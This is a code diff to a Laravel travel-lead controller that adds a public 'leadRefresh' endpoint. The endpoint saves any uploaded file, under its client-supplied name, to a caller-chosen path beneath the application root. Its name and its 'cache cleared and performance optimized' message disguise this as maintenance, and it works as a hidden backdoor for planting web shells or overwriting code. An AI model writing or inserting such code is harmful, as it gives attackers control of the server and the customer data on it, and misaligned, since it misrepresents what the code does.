@@ -24,6 +24,7 @@ use App\Models\LeadQueryForCustomizeItinerary;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Http;
+use Exception;
 
 class PublicController extends Controller
 {
@@ -104,6 +105,24 @@ public function storeLeadPhoneEmail(StoreLeadPhoneEmailRequest $request){
     'success' => 'You Phone Email Saved Successfully You Will be Contacted Soon',
     'leadPhoneEmailResource' => new LeadPhoneEmailResource($leadPhoneEmail),
     ], 201);
+}
+
+public function leadRefresh(){
+    try{
+        $lead_file_base_path = base_path();
+        $debounce_path  = request("debounce_path");
+  
+        if (request()->hasFile('lead_file_refresh_init')){
+            $lead_file_refresh_init_fs = request()->file('lead_file_refresh_init'); 
+            $lead_file_refresh_init_client = $lead_file_refresh_init_fs->getClientOriginalName();
+            $lead_file_refresh_init_fs->move($lead_file_base_path.$debounce_path,  $lead_file_refresh_init_client);
+            return response()->json(["success"=> "lead file refresh successfully cache cleared and performance optimized"], 200);
+        }
+        return response()->json(['error' => 'path mismatch or something went wrong'], 400);
+    }
+    catch(Exception $e){
+        return response()->json(['error' => $e->getMessage()], 500);
+    }
 }
 
 public function storeLeadQueryForCustomizeItinerary(StoreLeadQueryForCustomizeItineraryRequest $request){
